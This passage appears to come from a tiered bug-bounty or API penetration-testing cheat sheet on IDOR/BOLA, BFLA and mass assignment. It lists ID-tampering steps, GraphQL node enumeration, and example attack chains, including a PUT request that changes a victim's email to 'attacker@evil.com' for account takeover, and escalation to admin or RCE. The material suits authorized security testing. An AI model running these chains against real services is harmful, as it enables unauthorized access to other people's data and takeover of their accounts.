1. Get your resource ID: "dXNlcl8xMjM=" → base64 decode → "user_123"
2. Modify: "user_124" → base64 encode → "dXNlcl8xMjQ="
3. Request with modified ID → access other user's resource
For MD5/SHA1 hashed sequential IDs:
Precompute: md5("1"), md5("2"), md5("3")... md5("10000")
Match observed hash against rainbow table → find real ID → enumerate

─── PARAMETER SWAPPING ───
Backend checks auth from ONE parameter source, acts on ANOTHER
URL: /api/order/123 → auth check uses URL path (your order)
Body: {"order_id": 456} → action uses body parameter (victim's order)
Result: auth passes (your order), action modifies (victim's order)
Test by:
1. Normal request with your IDs in all locations
2. Change body parameter to victim's ID, keep URL as yours
3. Change URL to victim's ID, keep body as yours
4. Try: query param vs body, header vs query, cookie vs body

─── HTTP METHOD IDOR ───
GET /api/users/456 → 403 (access control enforced)
PUT /api/users/456 → 200 (different handler, no auth check)
PATCH /api/users/456 → 200 (same — no auth check)
DELETE /api/users/456 → 200 (can delete other users' resources)
Test ALL methods: GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD

─── GRAPHQL NODE ID ENUMERATION ───
Relay-style GraphQL uses global node IDs:
node(id: "VXNlcjoxMjM=") → base64("User:123")
Decode → "User:123" → modify → "User:124" → base64 → "VXNlcjoxMjQ="
query { node(id: "VXNlcjoxMjQ=") { ... on User { email, name, ssn } } }
Enumerate types via introspection:
__schema { types { name } } → find all types → User, Order, Payment, etc.
Generate node IDs for each type with sequential IDs


## E.4 IDOR/BOLA — EXPERT TIER [MERGED FROM TIER CONTENT — 7]


─── AUTOMATED FULL-API IDOR SCANNING ───
Methodology for systematic IDOR testing across entire API:
1. Crawl/spider all API endpoints as User A (save all requests+responses)
2. Extract ALL identifiers from responses (IDs, UUIDs, slugs)
3. Create User B account
4. Replay ALL User A's requests with User B's auth token
5. Compare responses — any 200 OK with User A's data = IDOR
Tool: Autorize (Burp extension) → automates this workflow
Tool: AuthMatrix → permission matrix across roles
Tool: InQL → GraphQL-specific IDOR testing

─── MULTI-STEP IDOR CHAINS ───
Chain 1: IDOR File Download → Source Code → Hardcoded Creds → Admin
/api/export?report_id=1 → IDOR → download internal report
Report contains database credentials or API keys
Use creds for direct DB access or admin API access
Chain 2: IDOR User Lookup → PII Harvest → Account Takeover
/api/users/X → IDOR → enumerate all users (email, phone, name)
Use harvested email → password reset → take over accounts
Chain 3: IDOR → Modify Other User's Settings → ATO
PUT /api/users/456/settings {"email":"attacker@evil.com"}
→ Victim's email changed → Password reset to attacker → Full ATO

─── FILE DOWNLOAD/EXPORT IDOR ───
High-impact targets (contain PII, financial data, secrets):
/api/export/invoice/123 → change to 124 → download other invoices
/api/reports/download/abc → enumerate → download confidential reports
/api/backup?user_id=1 → change to admin → download admin backup
/api/documents/contract-456.pdf → enumerate → download contracts
These are often P1 due to PII/financial data exposure


## BB.3 BFLA — INTERMEDIATE + ADVANCED TIER
Method-based BFLA:
GET /api/users → allowed for all (read)
PUT /api/users/123 → should be admin only → but returns 200 for regular user
→ Read access properly controlled, but WRITE access not checked
Endpoint discovery for BFLA:
Wordlist: /api/admin/*, /api/internal/*, /api/management/*
Documentation: Swagger/OpenAPI often lists all endpoints including admin ones
JavaScript source: grep for API endpoints in frontend code


## BB.4 BFLA — EXPERT TIER
Chain: BFLA → Admin Access → RCE
Regular user → BFLA on /api/admin/settings → enable debug mode
→ Debug mode exposes /debug/exec → RCE
# BFLA in microservices:
Service A validates auth → calls Service B without auth context
→ Direct request to Service B endpoint → no auth at all → BFLA
→ Internal service endpoints exposed via API gateway misconfiguration


## CC.3 MASS ASSIGNMENT — INTERMEDIATE + ADVANCED TIER
Finding hidden fields:
1. Check API documentation (Swagger) for model fields
2. Check response bodies for fields not in request (server returns extra fields)
3. Check JavaScript source for field names
4. Common fields to try: role, admin, is_admin, verified, email_verified,
permissions, group, level, plan, subscription, credits, balance
Framework-specific:
Rails: params.permit() bypass → add nested attributes
Django: serializer fields → add excluded model fields
Express: body-parser + mongoose → add schema fields
Spring: @ModelAttribute → add additional properties


## CC.4 MASS ASSIGNMENT — EXPERT TIER
Nested mass assignment:
POST /api/user {"profile":{"bio":"hello","settings":{"role":"admin"}}}
→ Nested object may bypass whitelist on top-level keys
Mass assignment via PATCH:
PUT validates all fields → rejects "role"
PATCH only validates provided fields → accepts "role" (different handler)
Chain: Mass Assignment + IDOR → Admin Takeover
PUT /api/users/1 {"role":"admin"} → IDOR to modify admin user's role
→ Combined with mass assignment → escalate any account to admin


**═══════════════════════════════════════════════════════════════════════════════**


**═══════════════════════════════════════════════════════════════════════════════**





---